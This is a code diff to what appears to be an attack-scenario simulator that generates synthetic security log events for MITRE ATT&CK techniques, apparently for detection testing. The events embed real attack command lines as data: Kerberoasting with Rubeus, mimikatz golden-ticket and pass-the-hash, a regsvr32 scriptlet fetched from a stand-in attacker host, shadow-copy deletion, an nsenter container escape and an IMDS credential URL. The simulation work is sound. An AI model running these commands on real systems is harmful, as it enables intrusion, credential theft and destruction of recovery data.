@@ -857,6 +857,289 @@ class AttackScenarioEngine:
                     "description": f"Command execution: {phase.get('description', '')}",
                 })
 
+        # --- Kerberoasting (T1558.003) / AS-REP Roasting (T1558.004) ----
+        elif technique in ("T1558.003", "T1558.004"):
+            ts = base_time
+            cmds = indicators.get("commands", [
+                "Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt",
+            ])
+            for i, cmd in enumerate(cmds[:3]):
+                events.append({
+                    **common,
+                    "timestamp": (ts + timedelta(seconds=i * 8)).isoformat(),
+                    "event_id": str(uuid.uuid4()),
+                    "event_type": "security",
+                    "src_host": target_host,
+                    "user": target_user,
+                    "process_name": "Rubeus.exe" if "Rubeus" in cmd else cmd.split()[0],
+                    "command_line": cmd,
+                    "description": f"Kerberoasting TGS ticket request with RC4 encryption (0x17): {cmd[:80]}",
+                    "tags": ["kerberoasting", "T1558.003"],
+                })
+
+        # --- Golden / Silver Ticket (T1558.001/T1558.002) ----------------
+        elif technique in ("T1558.001", "T1558.002"):
+            ts = base_time
+            events.append({
+                **common,
+                "timestamp": ts.isoformat(),
+                "event_id": str(uuid.uuid4()),
+                "event_type": "process",
+                "src_host": target_host,
+                "user": target_user,
+                "process_name": "mimikatz.exe",
+                "command_line": "mimikatz.exe kerberos::golden /user:backdoor /domain:corp.local /sid:S-1-5-21 /krbtgt:<hash>",
+                "description": "Golden Ticket forged: KRBTGT hash used to create arbitrary TGT with 10-year validity",
+                "tags": ["golden_ticket", "T1558.001"],
+            })
+
+        # --- Pass-the-Hash (T1550.002) -----------------------------------
+        elif technique == "T1550.002":
+            ts = base_time
+            events.append({
+                **common,
+                "timestamp": ts.isoformat(),
+                "event_id": str(uuid.uuid4()),
+                "event_type": "authentication",
+                "success": True,
+                "src_host": target_host,
+                "src_ip": indicators.get("source_internal_ip", src_ip),
+                "dst_host": phase.get("target_host", "srv-dc-01"),
+                "user": target_user,
+                "auth_method": "NTLM",
+                "command_line": "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<hash>",
+                "description": "Pass-the-Hash NTLM authentication using stolen hash without plaintext password",
+                "tags": ["pass_the_hash", "T1550.002"],
+            })
+
+        # --- Process Injection (T1055) -----------------------------------
+        elif technique in ("T1055", "T1055.001", "T1055.002", "T1055.012"):
+            ts = base_time
+            events.append({
+                **common,
+                "timestamp": ts.isoformat(),
+                "event_id": str(uuid.uuid4()),
+                "event_type": "process",
+                "src_host": target_host,
+                "user": target_user,
+                "process_name": "explorer.exe",
+                "command_line": "VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread targeting explorer.exe",
+                "description": "Process injection: shellcode injected into explorer.exe via reflective DLL loading",
+                "tags": ["process_injection", "T1055"],
+            })
+
+        # --- LOLBAS Execution (T1218) ------------------------------------
+        elif technique == "T1218":
+            ts = base_time
+            cmds = indicators.get("commands", ["regsvr32 /s /n /u /i:http://attacker/update.sct scrobj.dll"])
+            for i, cmd in enumerate(cmds[:3]):
+                events.append({
+                    **common,
+                    "timestamp": (ts + timedelta(seconds=i * 5)).isoformat(),
+                    "event_id": str(uuid.uuid4()),
+                    "event_type": "process",
+                    "src_host": target_host,
+                    "user": target_user,
+                    "process_name": cmd.split()[0] if cmd.split() else "regsvr32",
+                    "command_line": cmd,
+                    "description": f"LOLBAS execution (living-off-the-land): {cmd[:80]}",
+                    "tags": ["lolbas", "T1218"],
+                })
+
+        # --- Ransomware / Data Encrypted for Impact (T1486) -------------
+        elif technique == "T1486":
+            ts = base_time
+            events.append({
+                **common,
+                "timestamp": ts.isoformat(),
+                "event_id": str(uuid.uuid4()),
+                "event_type": "file_access",
+                "src_host": target_host,
+                "user": target_user,
+                "action": "encrypt",
+                "file_path": "/data/sensitive/customer_db.sql",
+                "description": "Mass file encryption in progress: AES-256, .blackcat extension, ransom note dropped",
+                "tags": ["ransomware", "T1486"],
+            })
+            events.append({
+                **common,
+                "timestamp": (ts + timedelta(seconds=30)).isoformat(),
+                "event_id": str(uuid.uuid4()),
+                "event_type": "file_access",
+                "src_host": target_host,
+                "user": target_user,
+                "action": "create",
+                "file_path": "/RECOVER-FILES.txt",
+                "description": "Ransom note created: RECOVER-FILES.txt — data encrypted, double extortion",
+                "tags": ["ransomware", "ransom_note"],
+            })
+
+        # --- Inhibit System Recovery / Shadow Copy deletion (T1490) -----
+        elif technique == "T1490":
+            ts = base_time
+            cmds = indicators.get("commands", [
+                "vssadmin.exe delete shadows /all /quiet",
+                "bcdedit /set {default} recoveryenabled No",
+            ])
+            for i, cmd in enumerate(cmds):
+                events.append({
+                    **common,
+                    "timestamp": (ts + timedelta(seconds=i * 3)).isoformat(),
+                    "event_id": str(uuid.uuid4()),
+                    "event_type": "process",
+                    "src_host": target_host,
+                    "user": target_user,
+                    "process_name": cmd.split(".")[0] if "." in cmd.split()[0] else cmd.split()[0],
+                    "command_line": cmd,
+                    "description": f"Volume Shadow Copy deletion — ransomware recovery prevention: {cmd}",
+                    "tags": ["shadow_copy_deletion", "T1490"],
+                })
+
+        # --- Container Escape (T1611) ------------------------------------
+        elif technique == "T1611":
+            ts = base_time
+            events.append({
+                **common,
+                "timestamp": ts.isoformat(),
+                "event_id": str(uuid.uuid4()),
+                "event_type": "process",
+                "src_host": target_host,
+                "user": "root",
+                "process_name": "nsenter",
+                "command_line": "nsenter --target 1 --mount --uts --ipc --net --pid -- bash",
+                "description": "Container escape via nsenter targeting host PID 1 — host OS access achieved",
+                "tags": ["container_escape", "T1611"],
+            })
+
+        # --- Cloud IMDS credential theft (T1552.005) --------------------
+        elif technique == "T1552.005":
+            ts = base_time
+            events.append({
+                **common,
+                "timestamp": ts.isoformat(),
+                "event_id": str(uuid.uuid4()),
+                "event_type": "web_access",
+                "src_host": target_host,
+                "src_ip": indicators.get("source_ip", src_ip),
+                "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                "method": "GET",
+                "user": target_user,
+                "description": "AWS EC2 IMDS credential theft via SSRF — IAM role credentials extracted",
+                "tags": ["cloud_imds", "T1552.005"],
+            })
+
+        # --- Network DoS / SYN Flood (T1498, T1498.001, T1498.002) ------
+        elif technique in ("T1498", "T1498.001", "T1498.002", "T1499"):
+            ts = base_time
+            attack_type = indicators.get("attack_type", "SYN Flood")
+            for i in range(self._rng.randint(5, 15)):
+                events.append({
+                    **common,
+                    "timestamp": (ts + timedelta(seconds=i * 0.5)).isoformat(),
+                    "event_id": str(uuid.uuid4()),
+                    "event_type": "network",
+                    "src_host": target_host,
+                    "src_ip": indicators.get("source_ip", src_ip),
+                    "dst_host": indicators.get("target_ip", "10.0.1.10"),
+                    "dst_ip": indicators.get("target_ip", "10.0.1.10"),
+                    "dst_port": int(indicators.get("dst_port", 80)),
+                    "protocol": "TCP" if "SYN" in attack_type else "UDP",
+                    "bytes": self._rng.randint(64, 1500),
+                    "user": "",
+                    "description": f"DDoS traffic burst #{i+1}: {attack_type} targeting {indicators.get('target_ip', '10.0.1.10')}",
+                    "tags": ["ddos", f"T{technique}"],
+                })
+
+        # --- DNS C2 / DNS Tunneling (T1071.004) -------------------------
+        elif technique == "T1071.004":
+            ts = base_time
+            domain = indicators.get("domain", "updates.attacker-c2.com")
+            for i in range(6):
+                label = "".join(self._rng.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=32))
+                events.append({
+                    **common,
+                    "timestamp": (ts + timedelta(minutes=i * self._rng.uniform(15, 45))).isoformat(),
+                    "event_id": str(uuid.uuid4()),
+                    "event_type": "dns",
+                    "src_host": target_host,
+                    "user": target_user,
+                    "domain": f"{label}.{domain}",
+                    "query_type": "TXT",
+                    "description": f"DNS tunneling C2 beacon #{i+1}: high-entropy TXT query to {domain}",
+                    "tags": ["dns_tunneling", "c2_traffic", "T1071.004"],
+                })
+
+        # --- Data from Cloud Storage / IAM Cloud (T1530, T1580, T1548.005, T1136.003) ---
+        elif technique in ("T1530", "T1580", "T1548.005", "T1136.003", "T1578"):
+            ts = base_time
+            cmds = indicators.get("commands", ["aws s3 ls", "aws iam list-users"])
+            for i, cmd in enumerate(cmds[:4]):
+                events.append({
+                    **common,
+                    "timestamp": (ts + timedelta(seconds=i * 10)).isoformat(),
+                    "event_id": str(uuid.uuid4()),
+                    "event_type": "application",
+                    "src_host": target_host,
+                    "src_ip": indicators.get("external_ip", src_ip),
+                    "user": target_user,
+                    "process_name": "aws-cli",
+                    "command_line": cmd,
+                    "description": f"Cloud API call: {cmd[:80]}",
+                    "tags": ["cloud_attack", technique],
+                })
+
+        # --- Archive / Data Staging (T1560.001, T1074.001) --------------
+        elif technique in ("T1560.001", "T1074.001"):
+            ts = base_time
+            cmds = indicators.get("commands", [
+                "7z a -p\"password\" backup.7z C:\\staging\\data\\*",
+            ])
+            for i, cmd in enumerate(cmds[:3]):
+                events.append({
+                    **common,
+                    "timestamp": (ts + timedelta(seconds=i * 15)).isoformat(),
+                    "event_id": str(uuid.uuid4()),
+                    "event_type": "process",
+                    "src_host": target_host,
+                    "user": target_user,
+                    "process_name": cmd.split()[0] if cmd.split() else "7z",
+                    "command_line": cmd,
+                    "description": f"Data staging/archiving: {cmd[:80]}",
+                    "tags": ["data_staging", technique],
+                })
+
+        # --- Registry Run Key Persistence (T1547.001) -------------------
+        elif technique == "T1547.001":
+            ts = base_time
+            cmd = indicators.get("commands", ["reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d C:\\Windows\\Temp\\payload.exe"])[0]
+            events.append({
+                **common,
+                "timestamp": ts.isoformat(),
+                "event_id": str(uuid.uuid4()),
+                "event_type": "security",
+                "src_host": target_host,
+                "user": target_user,
+                "command_line": cmd,
+                "description": f"Registry Run key persistence established: {cmd[:80]}",
+                "tags": ["persistence", "registry_run_key", "T1547.001"],
+            })
+
+        # --- User Execution: Malicious File (T1204.002) -----------------
+        elif technique == "T1204.002":
+            ts = base_time
+            attachment = indicators.get("attachment", "malicious_document.docx")
+            events.append({
+                **common,
+                "timestamp": ts.isoformat(),
+                "event_id": str(uuid.uuid4()),
+                "event_type": "email",
+                "src_host": target_host,
+                "src_ip": indicators.get("source_ip", src_ip),
+                "user": target_user,
+                "description": f"Malicious file opened: {attachment} — macro execution triggered PowerShell dropper",
+                "tags": ["user_execution", "malicious_file", "T1204.002"],
+            })
+
         # --- Generic fallback -------------------------------------------
         else:
             expected_logs = phase.get("expected_logs", [{"type": "security", "description": phase.get("description", "")}])
